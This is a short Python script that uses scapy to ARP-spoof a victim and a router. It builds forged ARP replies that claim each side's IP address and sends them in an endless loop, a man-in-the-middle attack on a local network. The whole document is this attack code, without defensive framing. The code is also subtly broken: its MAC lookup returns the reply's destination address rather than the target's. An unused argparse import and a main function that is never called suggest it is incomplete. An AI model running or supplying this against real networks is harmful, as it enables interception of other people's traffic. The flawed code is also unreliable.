import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import argparse
import time

victim = ""
ip_victim = ""
mac_victim = ""

router = ""
ip_router = ""
mac_router = ""



def get_mac_by_ip(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    p = ether / arp
    ans = scapy.srp1(p, timeout=2)
    # ans.show()
    try:
        mac = ans.dst
        return mac
    except Exception as e:
        print(f"exception {e}")
        return False

def get_spoof_package(victim_ip, spoofed_ip):
    victim_mac = get_mac_by_ip(victim_ip)
    if not victim_mac:
        print(f"no mac for ip {victim_ip}")
        exit(0)
    package = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoofed_ip)
    return package

def main(victim_ip, router_ip):
    packet_r = get_spoof_package(router_ip, victim_ip)
    packet_v = get_spoof_package(victim_ip, router_ip)
    while 1:
        scapy.send(packet_r)
        scapy.send(packet_v)